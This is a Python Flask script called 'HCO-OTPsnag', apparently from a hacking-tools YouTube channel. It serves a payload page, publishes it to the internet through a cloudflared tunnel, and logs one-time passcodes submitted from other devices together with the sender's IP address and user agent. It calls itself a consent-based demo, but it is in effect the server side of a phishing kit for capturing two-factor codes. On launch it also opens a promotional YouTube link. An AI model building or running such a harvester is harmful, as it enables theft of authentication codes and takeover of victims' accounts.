#!/usr/bin/env python3
"""
HCO-OTPsnag — Consent-first demo with YouTube redirect + red box.
Run: python3 main.py
"""
import os, time, webbrowser, subprocess, threading, re, argparse
from flask import Flask, request, render_template_string, jsonify
from datetime import datetime

YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = int(os.getenv("PORT", 8080))
HOST = os.getenv("HOST", "0.0.0.0")
LOGFILE = "consented_otps.log"

app = Flask(__name__)
HERE = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(HERE, "payload.html"), "r", encoding="utf-8") as f:
    PAYLOAD_HTML = f.read()

# minimal cloudflared helper
def find_cloudflared():
    try:
        subprocess.run(["cloudflared","--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def start_cloudflared(port, timeout=20):
    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception:
        return None, None

    url = {"value": None}
    pattern = re.compile(r"https?://[^\s]*trycloudflare\.com[^\s]*", re.IGNORECASE)

    def reader():
        try:
            for line in proc.stdout:
                if not line:
                    continue
                print("[cloudflared] " + line.strip())
                m = pattern.search(line)
                if m:
                    url["value"] = m.group(0)
                    break
        except Exception:
            pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()

    waited = 0
    while waited < timeout:
        if url["value"]:
            return proc, url["value"]
        time.sleep(0.5)
        waited += 0.5
    return proc, url["value"]

# terminal banner
def print_red_box():
    RED_BG = "\033[41m"
    GREEN = "\033[32m"
    BOLD = "\033[1m"
    RESET = "\033[0m"
    lines = ["HCO OTP Snag", "by Azhar"]
    width = max(len(l) for l in lines) + 6
    top = "╔" + "═" * width + "╗"
    bottom = "╚" + "═" * width + "╝"
    print(RED_BG + top + RESET)
    for line in lines:
        pad = width - len(line)
        left = pad // 2
        right = pad - left
        print(RED_BG + "║" + RESET + " " * left + BOLD + GREEN + line + RESET + " " * right + RED_BG + "║" + RESET)
    print(RED_BG + bottom + RESET)

# logging
def log_submission(data):
    ts = datetime.utcnow().isoformat() + "Z"
    entry = {"ts": ts, "from_ip": data.get("from_ip"), "ua": data.get("ua"), "otp_preview": data.get("otp_preview"), "note": data.get("note","")}
    with open(LOGFILE, "a", encoding="utf-8") as f:
        f.write(str(entry) + "\n")
    print("\n\033[1;31m[+] Consented OTP Submission:\033[0m")
    print("  OTP (masked):", entry["otp_preview"])
    print("  From IP:", entry["from_ip"])
    print("  UA:", entry["ua"])
    print("  Note:", entry["note"])
    print("  Time (UTC):", entry["ts"])
    print("--------------------------------------------------\n")

@app.route("/")
def index():
    # show a friendly page linking to /payload
    return "<h3>HCO-OTPsnag — open /payload (consent required)</h3>"

@app.route("/payload")
def payload():
    return render_template_string(PAYLOAD_HTML)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(force=True, silent=True) or {}
    ip = request.remote_addr
    ua = request.headers.get("User-Agent","")
    if not data.get("consent"):
        return jsonify({"status":"failed","reason":"no consent"}), 400
    otp = (data.get("otp","") or "").strip()
    if not otp:
        return jsonify({"status":"failed","reason":"no otp provided"}), 400
    # mask otp
    if len(otp) <= 2:
        preview = "*" * len(otp)
    else:
        preview = otp[0] + ("*" * (len(otp)-2)) + otp[-1]
    record = {"from_ip": ip, "ua": ua, "otp_preview": preview, "note": data.get("note","")}
    log_submission(record)
    return jsonify({"status":"ok","message":"Consented OTP recorded (masked)."}), 200

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--no-cf", action="store_true", help="skip cloudflared")
    args = parser.parse_args()

    print("This tool is not free. Redirecting to YouTube in 8 seconds...")
    try:
        webbrowser.open(YOUTUBE_URL)
    except Exception:
        print("Open this URL manually:", YOUTUBE_URL)
    time.sleep(8)
    print_red_box()

    cf_proc = None
    public_url = None
    if not args.no_cf:
        if find_cloudflared():
            print("[*] cloudflared detected — attempting to start tunnel...")
            cf_proc, public_url = start_cloudflared(PORT, timeout=20)
            if public_url:
                print("[+] cloudflared public URL:", public_url + "/payload")
            else:
                print("[!] cloudflared started but public URL could not be parsed; check cloudflared output above.")
        else:
            print("[!] cloudflared not found in PATH. To install cloudflared, download the binary appropriate to your architecture and place it in your PATH. You can still use ngrok or manual forwarding.")

    host_display = "127.0.0.1" if HOST == "0.0.0.0" else HOST
    local_url = f"http://{host_display}:{PORT}/payload"
    if public_url:
        print(f"[*] Payload URL (open from other device): {public_url}/payload")
    else:
        print(f"[*] Local payload URL: {local_url}")

    try:
        app.run(host=HOST, port=PORT)
    finally:
        if cf_proc:
            try:
                cf_proc.terminate()
                cf_proc.wait(timeout=3)
            except Exception:
                pass

if __name__ == "__main__":
    main()
